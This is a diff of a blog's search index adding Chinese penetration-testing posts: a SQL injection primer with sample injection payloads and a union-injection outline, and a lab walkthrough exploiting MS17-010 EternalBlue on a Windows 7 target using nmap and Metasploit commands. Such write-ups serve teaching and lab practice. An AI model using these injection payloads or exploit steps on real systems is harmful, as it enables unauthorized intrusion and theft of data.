@@ -1,9 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入</title>
+    <url>/2019/12/20/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p>
+<h3 id="SQL的类型"><a href="#SQL的类型" class="headerlink" title="SQL的类型"></a>SQL的类型</h3><h4 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h4><ol>
+<li>数字型注入:无需闭合 多为id?=1 and 1=1 –+</li>
+<li>字符型注入:需要闭合 多为name=’admin’ and 1=1 #</li>
+<li>搜索型注入:主要在数据搜索时没有过滤搜索参数search=’%搜索%’ and ‘%1%’=’%1%’</li>
+</ol>
+<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul>
+<li>基于布尔的盲注:根据页面返回结果判断条件真假注入</li>
+<li>基于时间的忙著:根据页面响应时间判断条件真假注入</li>
+<li>基于错误的注入:根据页面返回的错误信息查看数据库内容</li>
+<li>联合查询注入:可以使用union查询数据库内容</li>
+<li>堆查询注入:可以同时执行多条语句</li>
+</ul>
+<h2 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a>MySQL常用的系统函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()                     #MySQL版本</span><br><span class="line">user()                        #数据库用户名</span><br><span class="line">database()                    #数据库名</span><br><span class="line">current_user()                #当前用户名</span><br><span class="line">system_user()                 #系统函数名</span><br><span class="line">session_user()                #连接数据库的用户名</span><br><span class="line">@@datadir                     #数据库路径</span><br><span class="line">@@version_compile_os          #操作系统版本</span><br><span class="line">@@basedir                     #数据库安装路径</span><br></pre></td></tr></table></figure>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询注入利用的前提条件是有<code>显示位</code><br>显示位就是在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p>
+<h3 id="联合注入所用函数"><a href="#联合注入所用函数" class="headerlink" title="联合注入所用函数"></a>联合注入所用函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union           #union操作符用于连接两个以上的select语句的结果组合到一个结果集合中</span><br><span class="line">select          #select语句用于从数据库中选取数据</span><br><span class="line">order by        #order by 关键字默认按升序对结果进行排序</span><br><span class="line">group_concat()  #把括号内的值打印在一行,以逗号分隔,以升序排列</span><br><span class="line">from            #从</span><br><span class="line">where           #有条件地从表中选取数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="information-schema数据库说明"><a href="#information-schema数据库说明" class="headerlink" title="information_schema数据库说明"></a>information_schema数据库说明</h3><p>这是一个信息数据库,其中保存着其他数据库的数据库名，数据库的表名，数据库表里的列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema.SCHEMATA表：提供了当前mysql中数据库的信息。</span><br><span class="line">information_schema.TABLES表：提供了数据库中表的信息。</span><br><span class="line">information_schema.COLUMNS表：提供了表中的列信息。</span><br><span class="line">table_schema:数据库名</span><br><span class="line">table_name:表名</span><br><span class="line">column_name:列名</span><br></pre></td></tr></table></figure>
+<h3 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h3><ol>
+<li>判断注入点</li>
+<li>判断是整型还是字符型</li>
+<li>判断查询列数</li>
+<li>判断显示位</li>
+<li>获取所有数据库名</li>
+<li>获取数据库所有表名</li>
+<li>获取字段名</li>
+<li>获取字段中的数据</li>
+</ol>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><h3 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h3><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><h3 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h3><h3 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h3><h3 id="获取数据库所有表名"><a href="#获取数据库所有表名" class="headerlink" title="获取数据库所有表名"></a>获取数据库所有表名</h3><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><h3 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h3>]]></content>
+  </entry>
+  <entry>
+    <title>ms17-010永恒之蓝复现</title>
+    <url>/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="ms17-010永恒之蓝复现"><a href="#ms17-010永恒之蓝复现" class="headerlink" title="ms17-010永恒之蓝复现"></a>ms17-010永恒之蓝复现</h1><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<a id="more"></a>
+<p>现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化。</p>
+<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>攻击机系统：Kali-Linux<br>攻击机IP：192.168.75.52<br>靶机系统：win7<br>靶机IP：192.168.75.142</p>
+<h3 id="查看靶机系统及端口"><a href="#查看靶机系统及端口" class="headerlink" title="查看靶机系统及端口"></a>查看靶机系统及端口</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -O <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
+<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/nmapsaomiao.png" class="" title="This is an nmapsaomiao image">
+<h3 id="打开msf"><a href="#打开msf" class="headerlink" title="打开msf"></a>打开msf</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
+<h3 id="搜索相关的漏洞插件"><a href="#搜索相关的漏洞插件" class="headerlink" title="搜索相关的漏洞插件"></a>搜索相关的漏洞插件</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command</span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+<p>Auxiliarity（辅助模块）<br>Expoit（漏洞利用模块）</p>
+<h3 id="使用辅助验证插件测试"><a href="#使用辅助验证插件测试" class="headerlink" title="使用辅助验证插件测试"></a>使用辅助验证插件测试</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">1</span>                                                               yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
+<p>这里的<code>show options</code>是显示这个插件相关的一些参数，在<code>Required</code>这一栏下面是<code>yes</code>的表示必填参数，这里面还剩<code>RHOSTS</code>这个参数没有填写即目标网段。下面设置一个目标网段，准备进行扫描测试：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
+<p>设置扫描线程，插件默认是1，这里设置为10：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> threads <span class="comment">10</span></span><br><span class="line">threads <span class="comment">=&gt; 10</span></span><br></pre></td></tr></table></figure>
+<p>可以执行<code>show options</code>查看自己刚刚填写的参数信息：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS       <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>                                                  yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">10</span>                                                              yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
+<p> 执行<br> <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Host <span class="keyword">is</span> likely VULNERABLE to MS17<span class="number">-010</span>! - Windows <span class="number">7</span> Home Basic <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span>-bit)</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><br>主机可能易受MS17-010攻击!Windows 7家庭基础7601服务包1 x64位(64位)</p>
+<h3 id="使用exploit模块来进行攻击"><a href="#使用exploit模块来进行攻击" class="headerlink" title="使用exploit模块来进行攻击"></a>使用exploit模块来进行攻击</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner<span class="regexp">/smb/</span>smb_ms17_010) &gt; use exploit<span class="regexp">/windows/</span>smb<span class="regexp">/ms17_010_eternalblue</span></span><br></pre></td></tr></table></figure>
+<p>设置靶机ip</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
+<p>攻击</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/smb/ms17_010_eternalblue</span>) &gt; exploit</span><br></pre></td></tr></table></figure>
+<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/ip.png" class="" title="This is an ip image">
+<p>完成！</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>手机添加burp证书</title>
     <url>/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/</url>
     <content><![CDATA[<h1 id="手机添加burp证书"><a href="#手机添加burp证书" class="headerlink" title="手机添加burp证书"></a>手机添加burp证书</h1><p>手机使用逍遥模拟器<br>电脑windows10</p>
+<a id="more"></a>
 <h2 id="配置收集代理ip"><a href="#配置收集代理ip" class="headerlink" title="配置收集代理ip"></a>配置收集代理ip</h2><p>查看本机ip</p>
 <img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-14.png" class="" title="This is an image-14 image">
 <p>进入手机设置修改代理</p>
@@ -74,6 +146,11 @@
       <categories>
         <category>渗透测试</category>
       </categories>
+      <tags>
+        <tag>Bypass</tag>
+        <tag>SQL注入</tag>
+        <tag>SQLMap</tag>
+      </tags>
   </entry>
   <entry>
     <title>Hello World</title>
